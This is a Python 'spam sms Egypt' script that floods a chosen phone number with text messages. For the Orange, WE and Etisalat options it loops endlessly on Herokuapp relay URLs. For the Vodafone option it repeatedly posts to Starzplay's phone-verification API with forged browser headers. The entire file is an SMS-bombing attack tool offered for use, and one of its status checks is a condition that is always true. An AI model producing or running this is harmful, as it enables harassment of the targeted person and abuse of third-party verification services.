import os,sys,time
os.system("clear")
try:
	import requests
	import pyfiglet
except:
	os.system("pip install --upgrade pip")
	os.system("pip install requests")
	os.system("pip install pyfiglet")
	os.system("clear")
	os.system('python spam-sms-Egypt.py')

#color
R ='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
P='\033[1;36m'
W='\033[1;37m'
X='\033[1;38m'
A='\033[1;39m'


global s
global n



n = ('\n')
s = requests.session()

print(R+"[+]"+B+"___"+W+"__Developer__"+P+"Adel++Fox"+B+"____"+R+"[+]")

print(pyfiglet.figlet_format("spam sms"))
print(pyfiglet.figlet_format("Egypt"))


print("#########__Adel___Fox__###########"+n)

def orange():
	number =input(n+P+"[+]Enter Number:")
	print(n)
	url1 = ('https://adel-fox-spam-sms-orange.herokuapp.com/?number='+number)
	while True:
		try:
			req = s.get(url1).json()
			re = req['result']
			if 'Done send' in re:
				print(G+'Done Send ✅')
			elif 'Failed' in re:
				print(R+'Failed ❌')
			else:
				print(R+'Error')
		except:pass
	
def we():
	number =input(n+P+"[+]Enter Number:")
	print(n)
	url2 =('https://adel-fox-spam-sms-we.herokuapp.com/?number='+number)
	while True:
		try:
			req = s.get(url2).json()
			re = req['result']
			if 'Done send' in re:
				print(G+'Done Send ✅')
			elif 'Failed' in re:
				print(R+'Failed ❌')
			else:
				print(R+'Error')
		except:pass
	
def vodafone():
	number =input(n+P+"[+]Enter Number:")
	print(n)
	url3 =('https://adelfox-spam-sms-vodafone.herokuapp.com/?number='+number)
	while True:
		try:
			url = 'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'
			hd = {
    "Host": "arabia.starzplay.com",
    "content-length": "86",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"90\", \"Google Chrome\";v\u003d\"90\"",
    "accept": "application/json, text/javascript, */*; q\u003d0.01",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "origin": "https://arabia.starzplay.com", "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://arabia.starzplay.com/ar/partners/vodafone-egypt",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
    "cookie": "_gat_UA-52364929-4\u003d1"
}
			data = {
    'mobilePrefix': '20',
    'mobileNumber': number,
    'operator': 'vodafoneegypt',
    'subscriptionPeriod': 'WEEK'
}

			req =s.post(url,headers=hd,data=data)
			if 'smsTransactionId' in req.text:
				print(G+'Done send ✅')
			elif 'errorCode' or '400' in req.text:
				print(R+'Failled ❌')
			else:
				print(R+'Error')
		except:pass

def etisalat():
	number =input(n+P+"[+]Enter Number:")
	print(n)
	url4 =('https://adel-fox-spam-sms-etisalat.herokuapp.com/?number='+number)
	while True:
		try:
			req = s.get(url4).json()
			re = req['result']
			if 'Done send' in re:
				print(G+'Done Send ✅')
			elif 'Failed' in re:
				print(R+'Failed ❌')
			else:
				print(R+'Error')
		except:pass


def list():
	print(G+"[1]orange")
	print("[2]we")
	print("[3]vodafone")
	print("[4]etisalat")
list()
choose = input(n+P+"[+]choose:")

if choose =='1':
	orange()
	
elif choose =='2':
	we()
	
elif choose =='3':
	vodafone()
	
elif choose =='4':
	etisalat()
	
else:
	print(R+n+"Error ,  choose from list"+n)
	time.sleep(1)
	os.system('python spam-sms-Egypt.py')